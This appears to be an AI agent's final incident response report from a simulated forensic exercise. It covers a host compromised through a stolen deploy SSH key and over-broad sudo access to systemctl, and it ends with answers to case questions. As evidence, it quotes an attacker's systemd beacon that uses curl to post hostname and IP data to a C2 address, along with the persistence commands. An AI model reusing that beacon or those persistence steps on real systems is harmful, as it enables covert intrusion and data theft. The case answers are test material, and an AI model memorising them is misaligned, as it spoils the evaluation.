All 6 claims accepted. Here is the final report.

---

# Incident Response Report — webserver-prod-02

## Executive Summary

The host **webserver-prod-02** was compromised on **April 14 at 03:17 UTC** via the **deploy** service account. An attacker used a stolen SSH private key to authenticate from external IP **185.229.59.103** (confirmed C2 server), then leveraged the account's overly permissive NOPASSWD sudo access to install a persistent C2 beacon as a systemd service running as root.

## Attack Timeline

| Time (UTC) | Event | Source |
|---|---|---|
| Apr 14 03:17:44 | Attacker SSH login as `deploy` from **185.229.59.103** via publickey | auth.log:30 |
| Apr 14 03:18:02 | `sudo cat /etc/passwd` — host reconnaissance | auth.log:32 |
| Apr 14 03:18:12 | `sudo cp /tmp/update /usr/local/bin/update` — staged payload from /tmp | auth.log:35 |
| Apr 14 03:18:17 | `sudo chmod +x /usr/local/bin/update` — made payload executable | auth.log:36 |
| Apr 14 03:18:29 | `sudo tee /etc/systemd/system/system-updater.service` — wrote malicious unit | auth.log:37 |
| Apr 14 03:18:44 | `sudo systemctl daemon-reload` | auth.log:38 |
| Apr 14 03:18:58 | `sudo systemctl enable system-updater.service` — persistence | auth.log:39 |
| Apr 14 03:19:03 | `sudo systemctl start system-updater.service` — activated beacon | auth.log:40 |
| Apr 14 03:20:51 | Attacker session closed | auth.log:41 |

The entire intrusion lasted **~3 minutes**.

## Findings

### 1. Initial Access — Compromised SSH Key (inference)
The attacker authenticated as `deploy` from **185.229.59.103** using the same RSA key fingerprint (`SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ`) used by legitimate CI/CD logins from internal IP 10.0.1.50. No failed logins or brute force attempts preceded the access. The deploy account has two authorized keys (`deploy@ci-runner-1` and `deploy@ci-backup`); one of these private keys was compromised.

### 2. Privilege Escalation — NOPASSWD sudo on systemctl (confirmed)
The file `etc/sudoers.d/deploy` grants `deploy ALL=(root) NOPASSWD: /usr/bin/systemctl` — unrestricted, password-free systemctl access. This allowed the attacker to install, enable, and start any systemd service as root without further authentication.

### 3. Persistence — Malicious systemd Service (confirmed)
The attacker created `etc/systemd/system/system-updater.service`, a systemd unit that:
- Runs as **root**
- Executes: `curl -sX POST https://185.229.59.103:8443/beacon -d "host=$(hostname)&ip=$(hostname -I)"`
- Restarts every 600 seconds (`Restart=always`, `RestartSec=600`)
- Is enabled for boot persistence (`WantedBy=multi-user.target`)

This is a C2 beacon exfiltrating hostname and IP to the attacker's server.

### 4. Staged Binary (confirmed)
The attacker copied `/tmp/update` to `/usr/local/bin/update` and made it executable. The binary's contents are not available in the filesystem snapshot (the file at `/usr/local/bin/update` was not captured), but the sudo log confirms its placement.

### 5. IOC: 185.229.59.103 (confirmed)
Threat intelligence lookup confirms this IP as a **C2 server** (tags: c2, beacon, simulated; confidence: high).

## Shell History Analysis

| Account | History File | Commands | Content |
|---|---|---|---|
| **root** | `fs/root/.bash_history` | 4 | Routine admin: `apt update`, `apt upgrade`, `systemctl restart nginx`, `tail -f /var/log/nginx/error.log` |
| **deploy** | `fs/home/deploy/.bash_history` | 15 | Routine CI/CD: `git pull`, `npm ci`, `npm run build`, `npm test`, `curl registry.npmjs.org`, `docker ps`, etc. |
| **alice** | `fs/home/alice/.bash_history` | 6 | Routine log review: `ls`, `cd /var/log`, `tail nginx/access.log`, `sudo journalctl`, etc. |
| **bob** | *(no .bash_history on disk)* | — | Bob logged in twice (Apr 13 and Apr 14) but has no history file. Either never created, or was deleted. |

**Key finding:** None of the three shell histories contain any of the attacker's malicious commands. The attacker's actions during the Apr 14 03:17–03:20 session are recorded only in the auth.log sudo trail. The attacker's bash session likely did not flush history to disk (common when commands are piped or the session exits abnormally).

## Recommendations

1. **Immediately disable** and remove `system-updater.service`; remove `/usr/local/bin/update`
2. **Revoke and rotate** all SSH keys for the deploy account
3. **Restrict sudoers**: replace the bare `NOPASSWD: /usr/bin/systemctl` grant with specific allowed subcommands (e.g., `systemctl restart nginx` only)
4. **Block** outbound traffic to 185.229.59.103 at the network perimeter
5. **Investigate** how the deploy SSH private key was exfiltrated (CI/CD runner compromise, leaked secrets, etc.)
6. **Audit** all hosts that use the same deploy key for lateral movement

---

## Case Questions

**Case Q1:** Shell histories were analyzed for three accounts: **root**, **deploy**, and **alice**. A fourth account, **bob** (uid 1003), was checked but has no `.bash_history` file on disk.

**Case Q2:** No — none of the shell histories show what the attacker did. Deploy's `.bash_history` contains only routine CI/CD developer commands (git, npm, docker, etc.), not the malicious activity. The attacker's actions (reconnaissance via `cat /etc/passwd`, staging a binary from `/tmp`, installing a C2 beacon systemd service, enabling and starting it) are recorded **only in the auth.log sudo trail** (lines 32–40), not in any shell history file. The attacker's bash session did not persist its command history to disk.